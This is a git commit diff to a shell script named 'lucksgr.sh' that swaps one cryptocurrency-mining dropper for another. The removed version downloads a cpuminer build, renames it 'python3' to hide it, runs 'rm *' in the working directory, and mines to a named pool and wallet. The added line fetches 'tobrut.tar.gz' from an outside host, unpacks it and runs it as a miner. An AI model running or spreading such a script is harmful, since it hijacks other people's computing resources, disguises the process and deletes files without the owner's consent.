933ffc3b0efa904d22997a0bbd76925c79fc35ea
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2025-01-30 16:44:31 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,16 +1,1 @@
-
-wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
-
-tar -xzf dot
-
-rm dot
-
-mv cpuminer-sse2 python3
-
-mv python3 ~/
-
-rm *
-
-cd ~/
-
-./python3 -a  yespowersugar -o stratum+tcp://luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
+wget -O tobrut coli.sytes.net/tobrut.tar.gz && tar -xvf tobrut && ./tobrut -a yespowersugar -o gespaehhsotna -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.tesla -p x -t 4
